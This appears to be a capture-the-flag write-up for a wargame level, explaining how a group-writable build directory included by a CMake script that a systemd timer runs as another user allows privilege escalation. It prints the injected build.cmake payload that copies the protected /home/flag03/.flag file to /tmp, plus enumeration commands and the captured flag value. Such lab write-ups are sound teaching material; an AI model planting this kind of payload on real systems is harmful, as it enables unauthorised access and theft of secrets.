# Level03

Just like before, we can't access the flag file directly :
```bash
ls -ld /home/flag03
drwxr-x--- 2 flag03 flag03 4096 Jun  9 19:03 /home/flag03
```

We also check again for an application in /opt/snowcrash :
```bash
$ ls /opt/snowcrash/level03
CMakeLists.txt
```

We see a CMakeLists file, something important stands out :

```bash
file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)

string(REGEX MATCH "runtime_base=([^\n]+)" _ ${CONF_CONTENT})
set(RUNTIME_BASE ${CMAKE_MATCH_1})

string(REGEX MATCH "workspace=([^\n]+)" _ ${CONF_CONTENT})
set(WORKSPACE_NAME ${CMAKE_MATCH_1})

string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")

include(${RESOLVED_BUILD_PATH}/build.cmake)
```

When we try to build it, we can't, because we don't have access to `/etc/burbclave/burbclave.conf`. But we definitely have an exploit with the line :
```bash
include(${RESOLVED_BUILD_PATH}/build.cmake)
```
meaning if we can find and edit `{RESOLVED_BUILD_PATH}/build.cmake`, we could make CMake execute arbitrary commands.

But that doesn't serve any purpose if executed by user `level03`, we want `flag03`. We try to search for more info on 'burbclave' :

```bash
$ find / -type f -name *burbclave* -ls 2>/dev/null
   524466      4 -rw-r--r--   1 root     root          185 Jun  9 19:03 /etc/systemd/system/burbclave.timer
   524465      4 -rw-r--r--   1 root     root          215 Jun  9 19:03 /etc/systemd/system/burbclave.service
```

We find two systemd files, a service and a timer. The service file is as such :

```ini
[Unit]
Description=Burbclave build runner (one-shot)
After=network.target

[Service]
Type=oneshot
User=flag03
ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
StandardOutput=null
StandardError=null
```

We learn that there is a service executing the `CMakeLists.txt` as flag03 ! The timer file contains :

```ini
[Unit]
Description=Burbclave build runner timer — runs every minute

[Timer]
OnBootSec=30s
OnUnitActiveSec=60s
AccuracySec=1s
Unit=burbclave.service

[Install]
WantedBy=timers.target
```

which, as it says, runs the script every minute.

We now need to find `{RESOLVED_BUILD_PATH}/build.cmake`. If we look at our groups :

```bash
$ groups
level03 burbclave levelgroup
```

we see that we are part of the burbclave group. We search for directories that could correspond to the build path :

```bash
$ find / -type d \( -name '*burbclave*' -o -name '*workspace*' \) -ls 2>/dev/null
     3168      4 drwxr-xr-x   3 root     root         4096 Feb 10  2026 /usr/lib/python3/dist-packages/botocore/data/workspaces-web
     3167      4 drwxr-xr-x   3 root     root         4096 Feb 10  2026 /usr/lib/python3/dist-packages/botocore/data/workspaces-thin-client
     3169      4 drwxr-xr-x   3 root     root         4096 Feb 10  2026 /usr/lib/python3/dist-packages/botocore/data/workspaces
   138216      4 drwxrwxr-x   3 root     burbclave     4096 Jun  9 19:03 /var/lib/burbclave
   138131      4 drwx------   2 flag03   flag03        4096 Jun  9 19:03 /etc/burbclave
```

(we also search for workspaces, like mentionned in the CMakeLists.txt). We see a directory in /var/lib/burbclave, owned by group burbclave in which may have write permissions. Inside is a directory named staging. We can guess that is the directory included in the file. We inject the build file in `/var/lib/burbclave/staging/build.cmake` (see resource) :

```cmake
execute_process(
    COMMAND /usr/bin/cat /home/flag03/.flag
    OUTPUT_FILE /tmp/burbclave-flag.txt
)
```

We wait 60 seconds max for the timer, and we can now get the flag in `/tmp/burbclave-flag.txt` : b209ea91ad7a5c2a0b0f4e195ca4